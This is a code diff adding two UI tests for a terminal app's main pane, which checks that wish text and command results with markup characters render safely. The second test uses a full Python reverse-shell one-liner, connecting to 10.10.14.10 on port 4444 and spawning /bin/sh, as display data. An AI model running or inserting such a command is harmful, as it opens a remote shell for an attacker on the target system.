@@ -182,3 +182,79 @@ class TestMainPane:
             # Set to inactive
             pane.set_active(False)
             assert "active-pane" not in pane.classes
+    
+    @pytest.mark.asyncio
+    async def test_main_pane_with_markup_characters(self):
+        """Test that a MainPane can handle wish and commands with markup characters."""
+        # Create a test wish with markup characters
+        test_wish = Wish.create("Test wish with [markup] characters")
+        
+        # Add command results with markup characters
+        log_files = LogFiles(stdout="stdout.log", stderr="stderr.log")
+        
+        cmd1 = CommandResult.create(1, "echo '[bold]Hello[/bold]'", log_files)
+        cmd1.state = CommandState.SUCCESS
+        test_wish.command_results.append(cmd1)
+        
+        cmd2 = CommandResult.create(2, "grep -r \"[text]\" *.py", log_files)
+        cmd2.state = CommandState.SUCCESS
+        test_wish.command_results.append(cmd2)
+        
+        cmd3 = CommandResult.create(3, "python -c \"import os; print('[DEBUG]')\"", log_files)
+        cmd3.state = CommandState.SUCCESS
+        test_wish.command_results.append(cmd3)
+        
+        app = MainPaneTestApp()
+        async with app.run_test():
+            pane = app.query_one(MainPane)
+            
+            # Update with the test wish
+            pane.update_wish(test_wish)
+            
+            # Check that the content widget has markup disabled
+            content = app.query_one("#main-pane-content")
+            assert content is not None
+            assert content.markup is False
+            
+            # Check that the wish with markup characters is displayed correctly
+            rendered_text = content.renderable
+            assert "Test wish with [markup] characters" in rendered_text
+            
+            # Check that commands with markup characters are displayed correctly
+            # The special characters should be replaced with safer alternatives
+            assert "echo '[bold]Hello[/bold]'" in rendered_text or "echo '【bold】Hello【/bold】'" in rendered_text
+            assert "grep -r \"[text]\" *.py" in rendered_text or "grep -r '【text】' *.py" in rendered_text
+            assert "python -c \"import os; print('[DEBUG]')\"" in rendered_text or "python -c 'import os; print('【DEBUG】')'" in rendered_text
+    
+    @pytest.mark.asyncio
+    async def test_main_pane_with_problematic_command(self):
+        """Test that a MainPane can handle commands with problematic characters."""
+        # Create a test wish
+        test_wish = Wish.create("Test wish with problematic command")
+        
+        # Add a command with problematic characters (similar to the helloooo wish)
+        problematic_cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
+        log_files = LogFiles(stdout="stdout.log", stderr="stderr.log")
+        cmd = CommandResult.create(1, problematic_cmd, log_files)
+        cmd.state = CommandState.NETWORK_ERROR
+        test_wish.command_results.append(cmd)
+        
+        app = MainPaneTestApp()
+        async with app.run_test():
+            pane = app.query_one(MainPane)
+            
+            # Update with the test wish
+            pane.update_wish(test_wish)
+            
+            # Check that the content widget has markup disabled
+            content = app.query_one("#main-pane-content")
+            assert content is not None
+            assert content.markup is False
+            
+            # The command should be displayed without causing errors
+            # We don't check the exact text because the character replacement might vary,
+            # but we ensure that the command is displayed in some form
+            rendered_text = content.renderable
+            assert "Test wish with problematic command" in rendered_text
+            assert "python3 -c" in rendered_text
+            assert "📡❌" in rendered_text  # Network error emoji
